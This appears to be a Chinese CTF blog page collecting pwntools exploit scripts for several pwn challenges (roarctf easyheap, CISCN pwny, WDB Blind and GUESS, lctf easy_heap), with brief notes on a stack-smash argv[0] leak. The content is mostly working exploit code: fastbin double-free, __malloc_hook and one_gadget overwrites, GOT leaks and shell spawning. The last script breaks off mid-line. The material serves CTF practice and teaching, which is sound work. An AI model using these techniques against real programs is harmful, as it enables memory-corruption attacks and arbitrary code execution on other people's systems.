<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjExMTIuaHRt">https://bbs.pediy.com/thread-261112.htm<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="roarctf-2019-easyheap">roarctf-2019-easyheap</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process([<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;</span>,<span class="string">&quot;./ror&quot;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,25136)</span></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./libc-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_chunk</span>():</span></span><br><span class="line">	p.sendafter(<span class="string">&quot;please input your username:&quot;</span>,p64(<span class="number">0.1</span>)+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;please input your info:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;666&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;build or free?\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># close()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc2</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back2</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span>():</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk()</span><br><span class="line">back(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">back(<span class="number">2</span>,null)	<span class="comment"># b*0x10 --&gt; unsorted_bin, with size of 0xb1</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x10</span>)	<span class="comment"># split from unsorted_bin, ptr--&gt;this chunk</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x10</span>)	<span class="comment"># likewise, and after, chunk will be placed in small_bin, buf--&gt;this chunk</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">back(<span class="number">2</span>,null)	<span class="comment"># </span></span><br><span class="line">free()	<span class="comment"># double_free here</span></span><br><span class="line"><span class="comment"># &#x27;e&#x27;-&gt;&#x27;d&#x27;&lt;-&#x27;e&#x27;</span></span><br><span class="line"><span class="comment"># aka. fastbin_0x70: buf-&gt;ptr&lt;-buf</span></span><br><span class="line"></span><br><span class="line">fake_chunk_addr = <span class="number">0x0000602060</span></span><br><span class="line">malloc(<span class="number">0x60</span>,p64(fake_chunk_addr)) <span class="comment"># modify bk,ptr-&gt;0x602060</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x10</span>)	<span class="comment">#clean fastbin</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ror&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0xDEADBEEFDEADBEEF</span>))</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">read_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> libc</span><br><span class="line">base = read_addr - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(base)</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">back2(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">back2(<span class="number">2</span>,null)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;2&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;3&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free2()</span><br><span class="line">back2(<span class="number">2</span>,null)</span><br><span class="line">free2()</span><br><span class="line"></span><br><span class="line">malloc2(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;4&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">malloc2(<span class="number">0x60</span>,<span class="string">&quot;5&quot;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="comment">#[0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">malloc2(<span class="number">0x60</span>, <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one_gadget[<span class="number">3</span>]+base) + p64(realloc + <span class="number">0x14</span>) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;16&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec 1&gt;&amp;0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzY2ODAyL2FydGljbGUvZGV0YWlscy8xMDg4NzcxOTE=">https://blog.csdn.net/qq_43766802/article/details/108877191<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2021-ciscn-pwny">2021-ciscn-pwny</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwny&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">gadget=[<span class="string">&#x27;0x4f3d5&#x27;</span>,<span class="string">&#x27;0x4f432&#x27;</span>,<span class="string">&#x27;0x10a41c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> content != null:</span><br><span class="line">		p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,p64(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(<span class="number">0x100</span>,null)</span><br><span class="line">write(<span class="number">0x100</span>,null)</span><br><span class="line">read(<span class="number">0xfffffffffffffff8</span>)</span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line">stdout =  <span class="built_in">int</span>(p.recvline()[-<span class="number">13</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">libc_addr = stdout - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pie offset_data=code</span></span><br><span class="line">read(<span class="number">0xfffffffffffffff5</span>)</span><br><span class="line">data =  <span class="built_in">int</span>(p.recvline()[-<span class="number">13</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">pie = data - <span class="number">0x202008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print hex(stdout - 0x202020)</span></span><br><span class="line"></span><br><span class="line">libc.address = libc_addr</span><br><span class="line">mhook = libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one = <span class="built_in">int</span>(gadget[<span class="number">1</span>],<span class="number">16</span>) + libc_addr</span><br><span class="line"></span><br><span class="line">offset = (mhook - pie - <span class="number">0x202060</span>)//<span class="number">8</span>   <span class="comment">#id</span></span><br><span class="line"></span><br><span class="line">write(offset,p64(realloc + <span class="number">2</span>))</span><br><span class="line">write(offset-<span class="number">1</span>,p64(one))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)	<span class="comment">#scanf, too large use chunk(malloc hook)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9hcnR0bmJhMy5jbi8yMDIxLzA1LzE1L0NURi0wWDA0LUNJU0NOMjAyMS1QUkVMSU1JTkFSWQ==">https://arttnba3.cn/2021/05/15/CTF-0X04-CISCN2021-PRELIMINARY<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RvcmVidHIvYXJ0aWNsZS9kZXRhaWxzLzExNzEzNzMzNA==">https://blog.csdn.net/Torebtr/article/details/117137334<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0E5NTE4NjA1NTUvYXJ0aWNsZS9kZXRhaWxzLzExNjkxMDk0NQ==">https://blog.csdn.net/A951860555/article/details/116910945<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2018-WDB-Blind">2018-WDB-Blind</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./blind&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26142)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">back = <span class="number">0x4008E3</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x60201d</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">2</span>,<span class="string">&quot;dddd&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;c&quot;*0x43 + p64(0x602020) + p64(0x0602080) +p64(0x0602080+0x68) + p64(0x0602080 + 0x68*2) + p64(0x0602080 + 0x68*3)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aaa&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0x602020</span>) + p64(<span class="number">0x602090</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>) </span><br><span class="line">payload += p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">2</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">fakechunk = p64(<span class="number">0x00000000fbad8080</span>) + p64(<span class="number">0x602060</span>)*<span class="number">7</span> + p64(<span class="number">0x602061</span>) + p64(<span class="number">0</span>)*<span class="number">4</span>  + p64(<span class="number">0x602060</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x602060</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0x602060</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x00000000ffffffff</span>) + p64(<span class="number">0</span>) +  p64(<span class="number">0</span>) + p64(<span class="number">0x602090</span> + <span class="number">0x68</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,fakechunk[:<span class="number">0x68</span>])</span><br><span class="line">change(<span class="number">2</span>,fakechunk[<span class="number">0x68</span>:<span class="number">0x68</span>*<span class="number">2</span>])</span><br><span class="line">change(<span class="number">3</span>,fakechunk[<span class="number">0x68</span>*<span class="number">2</span>:]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">7</span>*<span class="number">8</span> + p64(back) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">change(<span class="number">4</span>, payload)</span><br><span class="line">change(<span class="number">0</span>,p64(<span class="number">0x602090</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># edit stdout-pointer to io-file-plus</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9jYTc0OGI1NjExNWU=">https://www.jianshu.com/p/ca748b56115e<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cDovL2IwbGRmcmV2LnRvcC8yMDE4LzA5LzA1LyVFNyVCRCU5MSVFOSVCQyU4RSVFNiU5RCVBRlB3biVFNCVCOSU4QmJsaW5kLw==">http://b0ldfrev.top/2018/09/05/网鼎杯Pwn之blind/<i class="fa fa-external-link-alt"></i></span></p>
<p>p *(struct _IO_FILE_plus *) stdout</p>
<h2 id="2018-WDB-GUESS">2018-WDB-GUESS</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522010905.png" alt="20210522010905"></p>
<p>拖到ida里f5<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522011430.png" alt="20210522011430"></p>
<p>程序把flag保存到栈上，然后将输入的值和flag进行比较，如果错误就新fork一个进程。漏洞函数明显在gets上，因为有两次fork的机会，所以可以肆无忌惮地触发canary达到某些目的（stack smash）</p>
<ul>
<li>argv[] 保存了环境变量，argv[0]保存的是程序路径，覆盖argv[0]可以使得触发stack smash的时候输出有用的东西，SS代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有两种方法找到argv[0]的地址：</p>
<ol>
<li>在main下断点</li>
<li>print &amp;__libc_argv[0]</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522013616.png" alt="20210522013616"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522013633.png" alt="20210522013633"></p>
<p>接下来就要找到s2和argv[0]之间的距离，这个通过gdb调试就可以得到<br>
这样，如果把argv[0]中的内容改为puts的got地址，就能将其输出，进而得到libc版本</p>
<p>第二步是找到flag在栈中的地址。<br>
在libc中有一个_environ函数，指向栈中保存着环境变量的地址，这个地址和[flag]之间的偏移是不变化的<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522020339.png" alt="20210522020339"></p>
<p>wp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27846</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./GUESS&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./GUESS&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># argv[0] stores file PATH by default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;argv[0]==0x7fffffffde48</span></span><br><span class="line"><span class="comment"># gets-&gt;0x7fffffffdd20</span></span><br><span class="line"></span><br><span class="line">offset1 = <span class="number">0xe48</span> - <span class="number">0xd20</span></span><br><span class="line"><span class="comment">#print hex(offset1)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x128</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">puts = u64(p.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (environ)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">environ_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x128</span> + p64(environ_addr - <span class="number">360</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7fffffffde58 - 0x7fffffffdcf0</span></span><br></pre></td></tr></table></figure>
<h2 id="lctf-2018-easy-heap">lctf 2018 easy_heap</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./easy_heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size,context</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size \n&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;content \n&gt; &quot;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index \n&gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index \n&gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;111&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># place in unsorted_bin and tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x200</span></span><br><span class="line"><span class="comment"># split unsorted chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;77777777&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;88888888&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;99999999&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 3 prev_inuse</span></span><br><span class="line">malloc(<span class="number">0xf8</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 